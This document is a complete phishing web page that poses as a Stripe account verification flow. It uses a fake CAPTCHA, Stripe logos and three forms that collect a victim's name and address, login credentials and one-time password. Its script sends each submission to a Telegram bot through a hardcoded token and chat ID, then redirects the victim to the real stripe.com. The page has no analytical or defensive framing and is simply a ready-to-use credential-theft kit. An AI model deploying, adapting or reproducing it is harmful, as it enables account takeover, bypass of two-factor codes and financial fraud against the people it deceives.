<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        /* Modern CSS Reset */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        /* General Styles */
		body {
			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
			margin: 0;
			color: #333;
			line-height: 1.6;
			position: relative;
			overflow: hidden;
		}
		
		/* Animated Background */
		.animated-background {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			z-index: -1;
			background: linear-gradient(
				225deg,
				#FF69B4,    /* Pink */
				#FF1493,    /* Deep Pink */
				#FF4500,    /* Orange Red */
				#FFA500,    /* Orange */
				#9400D3,    /* Violet */
				#4169E1,    /* Royal Blue */
				#00CED1     /* Turquoise */
			);
			background-size: 300% 300%;
			animation: gradientAnimation 20s ease infinite;
		}

		.background-overlay {
			position: fixed;
			bottom: 0;
			left: 0;
			right: 0;
			height: 60%;
			background: white;
			border-radius: 50% 50% 0 0;
			transform: scale(1.5);
		}

		@keyframes gradientAnimation {
			0% {
				background-position: 0% 50%;
			}
			50% {
				background-position: 100% 50%;
			}
			100% {
				background-position: 0% 50%;
			}
		}

        /* Main Container */
        .page-wrapper {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 2rem;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            padding: 2.5rem;
            border-radius: 1.5rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            opacity: 0;
            transform: translateY(20px);
            animation: fadeIn 0.5s ease forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Logo and Header */
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo {
            width: 6rem;
            height: auto;
            margin-bottom: 1rem;
        }

        h2 {
            font-size: 1.75rem;
            color: #1a1a1a;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: #666;
            font-size: 0.95rem;
        }

        /* Form Elements */
        .form-section {
            margin-bottom: 2rem;
        }

        .input-group {
            margin-bottom: 1.25rem;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            color: #555;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 0.875rem 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 0.75rem;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #fff;
        }

        input:focus {
            border-color: #4a90e2;
            outline: none;
            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
        }

        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 0.5rem;
            display: none;
        }

        /* Buttons */
        .button {
            width: 100%;
            padding: 1rem;
            background-color: #4a90e2;
            border: none;
            border-radius: 0.75rem;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .button:hover {
            background-color: #357abd;
            transform: translateY(-2px);
        }

        .button:active {
            transform: translateY(0);
        }

        /* CAPTCHA Overlay */
        #captchaContainer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .captcha-box {
            background: white;
            padding: 2.5rem;
            border-radius: 1.5rem;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }

        .captcha-question {
            font-size: 1.5rem;
            margin: 1.5rem 0;
            padding: 1rem;
            background: #f8f9fa;
            border-radius: 0.75rem;
            font-weight: 600;
        }

        /* Progress Steps */
        .progress-steps {
            display: flex;
            justify-content: center;
            margin-bottom: 2rem;
        }

        .step {
            width: 2rem;
            height: 2rem;
            border-radius: 50%;
            background: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 0.5rem;
            color: #666;
            font-weight: 600;
            position: relative;
        }

        .step.active {
            background: #4a90e2;
            color: white;
        }

        .step::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            background: #e0e0e0;
            right: -100%;
            top: 50%;
            transform: translateY(-50%);
        }

        .step:last-child::after {
            display: none;
        }

        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 1.5rem;
            height: 1.5rem;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Success Animation */
        .success-checkmark {
            width: 4rem;
            height: 4rem;
            margin: 0 auto 1rem;
            display: none;
        }

        .success-checkmark .check-icon {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid #4CAF50;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: checkmark 0.8s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .success-checkmark .check-icon::before {
            content: '';
            width: 50%;
            height: 3px;
            background: #4CAF50;
            transform: rotate(45deg);
        }

        @keyframes checkmark {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }

        /* Responsive Design */
        @media (max-width: 480px) {
            .container {
                padding: 1.5rem;
            }

            .captcha-box {
                padding: 1.5rem;
            }

            h2 {
                font-size: 1.5rem;
            }
        }

        /* Dark Mode Support */
        @media (prefers-color-scheme: dark) {
            body {
                background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
                color: #e0e0e0;
            }

            .container, .captcha-box {
                background: #2a2a2a;
            }

            input {
                background: #3a3a3a;
                border-color: #4a4a4a;
                color: #e0e0e0;
            }

            h2 {
                color: #e0e0e0;
            }

            .subtitle {
                color: #b0b0b0;
            }

            .captcha-question {
                background: #3a3a3a;
                color: #e0e0e0;
            }
        }
    </style>
</head>

<body>
    <!-- CAPTCHA Overlay -->
	<div class="animated-background"></div>
	<div class="background-overlay"></div>
    <div id="captchaContainer">
        <div class="captcha-box">
            <h2>Stripe Security Verification</h2>
            <p>Please solve this simple math problem to continue</p>
            <div id="captcha-question" class="captcha-question"></div>
            <div class="input-group">
                <input type="number" id="captcha-answer" placeholder="Enter your answer" autocomplete="off">
                <div class="error-message" id="captcha-error"></div>
            </div>
            <button onclick="verifyCaptcha()" class="button">Verify</button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="page-wrapper">
        <div id="mainContent" style="display: none;">
            <!-- User Information Form -->
            <div id="userInfoContainer" class="container">
                <div class="header">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
                    <h2>Account Verification</h2>
                    <p class="subtitle">Please verify your information to continue</p>
                </div>

                <div class="progress-steps">
                    <div class="step active">1</div>
                    <div class="step">2</div>
                    <div class="step">3</div>
                </div>

                <form id="userInfoForm">
                    <div class="form-section">
                        <div class="input-group">
                            <label for="firstName">First Name</label>
                            <input type="text" id="firstName" name="firstName" required>
                            <div class="error-message"></div>
                        </div>
                        <div class="input-group">
                            <label for="lastName">Last Name</label>
                            <input type="text" id="lastName" name="lastName" required>
                            <div class="error-message"></div>
                        </div>
                    </div>

                    <div class="form-section">
                        <div class="input-group">
                            <label for="address">Address</label>
                            <input type="text" id="address" name="address" required>
                            <div class="error-message"></div>
                        </div>
                        <div class="input-group">
                            <label for="city">City</label>
                            <input type="text" id="city" name="city" required>
                            <div class="error-message"></div>
                        </div>
                        <div class="input-group">
                            <label for="state">State</label>
                            <input type="text" id="state" name="state" required>
                            <div class="error-message"></div>
                        </div>
                        <div class="input-group">
                            <label for="zip">ZIP Code</label>
                            <input type="text" id="zip" name="zip" required>
                            <div class="error-message"></div>
                        </div>
                    </div>

                    <button type="submit" class="button">Continue</button>
                </form>
            </div>

            <!-- Login Form -->
            <div id="loginContainer" class="container" style="display: none;">
                <div class="header">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
                    <h2>Account Login</h2>
                    <p class="subtitle">Please enter your credentials</p>
                </div>

                <div class="progress-steps">
                    <div class="step">1</div>
                    <div class="step active">2</div>
                    <div class="step">3</div>
                </div>

                <form id="loginForm">
                    <div class="form-section">
                        <div class="input-group">
                            <label for="userIdentifier">Email or Username</label>
                            <input type="text" id="userIdentifier" name="userIdentifier" required>
                            <div class="error-message"></div>
                        </div>
                        <div class="input-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" required>
                            <div class="error-message"></div>
                        </div>
                    </div>

                    <button type="submit" class="button">Continue</button>
                </form>
            </div>

            <!-- OTP Verification Form -->
            <div id="otpContainer" class="container" style="display: none;">
                <div class="header">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
                    <h2>OTP Verification</h2>
                    <p class="subtitle">Enter the code sent to your device</p>
                </div>

                <div class="progress-steps">
                    <div class="step">1</div>
                    <div class="step">2</div>
                    <div class="step active">3</div>
                </div>

                <form id="otpForm">
                    <div class="form-section">
                        <div class="input-group">
                            <label for="otp">One-Time Password</label>
                            <input type="text" id="otp" name="otp" required maxlength="10">
                            <div class="error-message"></div>
                        </div>
                    </div>

                    <button type="submit" class="button">Verify</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        // CAPTCHA functionality
        let num1, num2, correctAnswer;
        let attempts = 0;
        const maxAttempts = 3;

        // Validators
        const validators = {
            firstName: (value) => {
                if (value.length < 2) return 'First name is too short';
                if (!/^[a-zA-Z\s-']+$/.test(value)) return 'First name contains invalid characters';
                return '';
            },
            lastName: (value) => {
                if (value.length < 2) return 'Last name is too short';
                if (!/^[a-zA-Z\s-']+$/.test(value)) return 'Last name contains invalid characters';
                return '';
            },
            address: (value) => {
                if (value.length < 5) return 'Please enter a valid address';
				return '';
            },
            city: (value) => {
                if (value.length < 2) return 'Please enter a valid city';
                if (!/^[a-zA-Z\s-']+$/.test(value)) return 'City contains invalid characters';
                return '';
            },
            state: (value) => {
                if (value.length < 2) return 'Please enter a valid state';
                return '';
            },
            zip: (value) => {
                if (!/^\d{5}(-\d{4})?$/.test(value)) return 'Please enter a valid ZIP code';
                return '';
            },
            userIdentifier: (value) => {
                if (value.length < 3) return 'Please enter a valid email or username';
                return '';
            },
            password: (value) => {
                if (value.length < 6) return 'Password must be at least 6 characters';
                return '';
            },
            otp: (value) => {
                if (!/^\d{4,10}$/.test(value)) return 'Please enter a valid OTP (4-10 digits)';
                return '';
            }
        };

        // CAPTCHA Implementation
        function generateCaptcha() {
            num1 = Math.floor(Math.random() * 20) + 1;
            num2 = Math.floor(Math.random() * 20) + 1;
            correctAnswer = num1 + num2;
            document.getElementById('captcha-question').innerText = `What is ${num1} + ${num2}?`;
            document.getElementById('captcha-answer').value = '';
            document.getElementById('captcha-error').style.display = 'none';
        }

        function verifyCaptcha() {
            const userAnswer = document.getElementById('captcha-answer').value;
            const errorElement = document.getElementById('captcha-error');

            if (!userAnswer) {
                errorElement.innerText = 'Please enter an answer';
                errorElement.style.display = 'block';
                return;
            }

            if (parseInt(userAnswer) === correctAnswer) {
                document.getElementById('captchaContainer').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
            } else {
                attempts++;
                if (attempts >= maxAttempts) {
                    errorElement.innerText = 'Too many incorrect attempts. Please try again later.';
                    errorElement.style.display = 'block';
                    setTimeout(() => window.location.reload(), 3000);
                } else {
                    errorElement.innerText = `Incorrect answer. ${maxAttempts - attempts} attempts remaining.`;
                    errorElement.style.display = 'block';
                    generateCaptcha();
                }
            }
        }

        // Form Submission Handler
        async function handleFormSubmit(formId, nextFormId) {
            const form = document.getElementById(formId);
            let isValid = true;

            // Validate all inputs
            form.querySelectorAll('input').forEach(input => {
                const validator = validators[input.id];
                if (validator) {
                    const error = validator(input.value);
                    const errorElement = input.nextElementSibling;
                    if (error) {
                        errorElement.innerText = error;
                        errorElement.style.display = 'block';
                        isValid = false;
                    } else {
                        errorElement.style.display = 'none';
                    }
                }
            });

            if (!isValid) return false;

            // Show loading state
            const button = form.querySelector('button');
            const originalText = button.innerText;
            button.innerHTML = '<div class="spinner"></div>';
            button.disabled = true;

            try {
                // Collect form data
                const formData = new FormData(form);
                const data = {};
                formData.forEach((value, key) => data[key] = value);

                // Send data to Telegram
                await sendToTelegram(formId, data);

                // Success handling
                button.innerHTML = 'âœ“ Success';
                setTimeout(() => {
                    if (nextFormId) {
                        document.getElementById(formId).closest('.container').style.display = 'none';
                        document.getElementById(nextFormId).style.display = 'block';
                    } else {
                        // Final form submission
                        window.location.href = 'https://stripe.com';
                    }
                }, 1000);
            } catch (error) {
                console.error('Error:', error);
                button.innerHTML = originalText;
                button.disabled = false;
            }
        }

        // Telegram Integration
        async function sendToTelegram(formId, data) {
            const telegramBotToken = '6620305104:AAFCfGH0q9azZkxN3TDNqDTe0k_MehLnWA4';
            const telegramChatId = '-4275885611';
            
            let message = `<b>New ${formId} Submission</b>\n\n`;
            Object.entries(data).forEach(([key, value]) => {
                message += `<b>${key}</b>: ${value}\n`;
            });

            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (!response.ok) {
                throw new Error('Failed to send message to Telegram');
            }
        }

        // Event Listeners
        document.addEventListener('DOMContentLoaded', () => {
            generateCaptcha();

            // Form submissions
            document.getElementById('userInfoForm').addEventListener('submit', (e) => {
                e.preventDefault();
                handleFormSubmit('userInfoForm', 'loginContainer');
            });

            document.getElementById('loginForm').addEventListener('submit', (e) => {
                e.preventDefault();
                handleFormSubmit('loginForm', 'otpContainer');
            });

            document.getElementById('otpForm').addEventListener('submit', (e) => {
                e.preventDefault();
                handleFormSubmit('otpForm');
            });

            // CAPTCHA enter key support
            document.getElementById('captcha-answer').addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    verifyCaptcha();
                }
            });
        });
    </script>
</body>
</html>
